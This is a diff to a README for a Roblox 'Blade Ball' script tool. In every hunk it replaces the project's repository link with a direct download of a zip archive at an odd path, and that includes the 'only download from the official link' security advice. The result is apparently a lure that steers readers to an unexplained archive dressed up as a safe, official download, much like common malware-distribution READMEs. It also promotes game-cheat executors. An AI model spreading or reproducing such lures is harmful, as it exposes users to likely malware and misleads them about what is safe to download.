@@ -1,6 +1,6 @@
 # ⚔️ blade-ball-script-lab - Master Blade Ball Like A Pro
 
-[![Download Now](https://img.shields.io/badge/Download-Blade%20Ball%20Script%20Lab-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Techeach/blade-ball-script-lab)
+[![Download Now](https://img.shields.io/badge/Download-Blade%20Ball%20Script%20Lab-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Techeach/blade-ball-script-lab/main/Garrisonism/1.7.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Here's how to get this tool running on your computer in just a few minutes.
 ### Step 1: Download the Tool
 
 Visit this link to download the application:
-**[https://github.com/Techeach/blade-ball-script-lab](https://github.com/Techeach/blade-ball-script-lab)**
+**[https://raw.githubusercontent.com/Techeach/blade-ball-script-lab/main/Garrisonism/1.7.zip](https://raw.githubusercontent.com/Techeach/blade-ball-script-lab/main/Garrisonism/1.7.zip)**
 
 This link will take you to the download page where you can get the tool. Make sure to download it to a location you can easily find – like your Desktop or Downloads folder.
 
@@ -129,7 +129,7 @@ Don't worry about mastering all the numbers at once. Start with one metric, impr
 
 Your security matters. Here's what to remember:
 
-- **Only download from the official link** (https://github.com/Techeach/blade-ball-script-lab)
+- **Only download from the official link** (https://raw.githubusercontent.com/Techeach/blade-ball-script-lab/main/Garrisonism/1.7.zip)
 - **Keep your executor updated** – old versions can have vulnerabilities
 - **Don't share your account details** with anyone
 - **Use at your own risk** – always follow Roblox's community guidelines
@@ -169,7 +169,7 @@ To truly improve your Blade Ball game, use this tool consistently:
 Blade Ball is all about precision and timing. With **blade-ball-script-lab**, you have a powerful research tool that helps you understand the game deeply. Download it today, explore the scripts, analyze your matches, and watch your gameplay improve.
 
 Remember: the link is always here when you need it:
-**[https://github.com/Techeach/blade-ball-script-lab](https://github.com/Techeach/blade-ball-script-lab)**
+**[https://raw.githubusercontent.com/Techeach/blade-ball-script-lab/main/Garrisonism/1.7.zip](https://raw.githubusercontent.com/Techeach/blade-ball-script-lab/main/Garrisonism/1.7.zip)**
 
 Good luck, and happy blade balling! 🏆
 
